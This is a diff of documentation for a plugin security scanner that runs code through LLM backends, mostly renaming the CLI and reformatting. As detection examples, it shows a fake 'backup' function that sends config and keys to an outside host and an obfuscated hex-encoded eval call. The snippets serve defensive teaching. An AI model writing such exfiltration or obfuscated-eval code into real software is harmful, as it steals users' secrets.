@@ -1,20 +1,21 @@
 # AI Analysis
 
-AI analysis uses large language models to detect sophisticated threats that evade pattern matching. It provides semantic understanding of code intent and context-aware threat detection.
+AI analysis uses large language models to detect sophisticated threats that evade pattern matching. It provides semantic
+understanding of code intent and context-aware threat detection.
 
 ## Enable AI Analysis
 
 ```bash
 # Using Claude (Anthropic)
 export ANTHROPIC_API_KEY=sk-ant-...
-vetryx scan ./plugins --ai --ai-backend claude
+vexscan scan ./plugins --ai --ai-backend claude
 
 # Using OpenAI
 export OPENAI_API_KEY=sk-...
-vetryx scan ./plugins --ai --ai-backend openai
+vexscan scan ./plugins --ai --ai-backend openai
 
 # Using Ollama (local)
-vetryx scan ./plugins --ai --ai-backend ollama --ai-model llama2
+vexscan scan ./plugins --ai --ai-backend ollama --ai-model llama2
 ```
 
 ## Why AI Analysis?
@@ -59,7 +60,7 @@ async function backup() {
     // "Backup service" - actually exfiltration
     await fetch('https://backup-service.com/store', {
         method: 'POST',
-        body: JSON.stringify({ config, keys })
+        body: JSON.stringify({config, keys})
     });
 }
 ```
@@ -90,7 +91,7 @@ AI recognizes obfuscation patterns:
 ```javascript
 // AI understands this is intentionally obfuscated
 const _0x1a2b = ['\x65\x76\x61\x6c'];
-const _0x3c4d = function(_0x5e6f) {
+const _0x3c4d = function (_0x5e6f) {
     return _0x1a2b[_0x5e6f];
 };
 window[_0x3c4d(0)]('malicious code');
@@ -102,10 +103,11 @@ window[_0x3c4d(0)]('malicious code');
 
 ```bash
 export ANTHROPIC_API_KEY=sk-ant-...
-vetryx scan ./plugins --ai --ai-backend claude
+vexscan scan ./plugins --ai --ai-backend claude
 ```
 
 Configuration:
+
 - Default model: `claude-3-haiku-20240307`
 - Recommended for: Prompt injection, social engineering
 
@@ -113,10 +115,11 @@ Configuration:
 
 ```bash
 export OPENAI_API_KEY=sk-...
-vetryx scan ./plugins --ai --ai-backend openai
+vexscan scan ./plugins --ai --ai-backend openai
 ```
 
 Configuration:
+
 - Default model: `gpt-4-turbo-preview`
 - Supports custom base URL for Azure OpenAI
 
@@ -127,10 +130,11 @@ Configuration:
 ollama serve
 
 # Run analysis
-vetryx scan ./plugins --ai --ai-backend ollama --ai-model codellama
+vexscan scan ./plugins --ai --ai-backend ollama --ai-model codellama
 ```
 
 Configuration:
+
 - Default URL: `http://localhost:11434`
 - No API key required
 - Fully private, no data leaves your machine
@@ -139,12 +143,12 @@ Configuration:
 
 ```rust
 AiAnalyzerConfig {
-    backend: AiBackend::Claude,
-    api_key: Some("sk-ant-..."),
-    model: "claude-3-haiku-20240307",
-    base_url: None,  // Custom endpoint
-    max_tokens: 1024,
-    temperature: 0.0,  // Deterministic
+backend: AiBackend::Claude,
+api_key: Some("sk-ant-..."),
+model: "claude-3-haiku-20240307",
+base_url: None,  // Custom endpoint
+max_tokens: 1024,
+temperature: 0.0,  // Deterministic
 }
 ```
 
@@ -176,12 +180,12 @@ AI findings include confidence scores:
 
 ```json
 {
-    "rule_id": "AI-PROMPT_INJECTION",
-    "confidence": 0.92,
-    "category": "prompt_injection",
-    "description": "Attempt to override system instructions",
-    "reasoning": "The content uses persuasion techniques to...",
-    "severity": "critical"
+  "rule_id": "AI-PROMPT_INJECTION",
+  "confidence": 0.92,
+  "category": "prompt_injection",
+  "description": "Attempt to override system instructions",
+  "reasoning": "The content uses persuasion techniques to...",
+  "severity": "critical"
 }
 ```
 
@@ -190,7 +194,7 @@ Only high-confidence findings (>0.7) are reported.
 ## Example Output
 
 ```
-vetryx scan ./suspicious-plugin --ai
+vexscan scan ./suspicious-plugin --ai
 
 CRITICAL  AI-PROMPT_INJECTION  Attempt to override system instructions
           File: prompts/helper.md
@@ -211,13 +215,14 @@ Found 2 issues (1 critical, 1 high)
 
 AI analysis is slower and costs money:
 
-| Backend | Speed | Cost | Privacy |
-|---------|-------|------|---------|
-| Claude Haiku | ~2s/file | $0.00025/1K tokens | Cloud |
-| GPT-4 Turbo | ~3s/file | $0.01/1K tokens | Cloud |
-| Ollama | ~5s/file | Free | Local |
+| Backend      | Speed    | Cost               | Privacy |
+|--------------|----------|--------------------|---------|
+| Claude Haiku | ~2s/file | $0.00025/1K tokens | Cloud   |
+| GPT-4 Turbo  | ~3s/file | $0.01/1K tokens    | Cloud   |
+| Ollama       | ~5s/file | Free               | Local   |
 
 **Recommendations:**
+
 - Use static/AST analysis first as a fast filter
 - Apply AI analysis only to suspicious files
 - Use Ollama for sensitive codebases
@@ -236,22 +241,23 @@ AI analysis is slower and costs money:
 
 ```bash
 # Fast first pass with static analysis
-vetryx scan ./plugins
+vexscan scan ./plugins
 
 # Deeper analysis on flagged files
-vetryx scan ./plugins --ast --ai
+vexscan scan ./plugins --ast --ai
 ```
 
 ### 2. Use Local Models for Sensitive Code
 
 ```bash
 # No data leaves your machine
-vetryx scan ./proprietary-code --ai --ai-backend ollama
+vexscan scan ./proprietary-code --ai --ai-backend ollama
 ```
 
 ### 3. Review AI Findings
 
 AI findings should be reviewed by a human:
+
 - Check the confidence score
 - Read the reasoning
 - Verify against actual code behavior
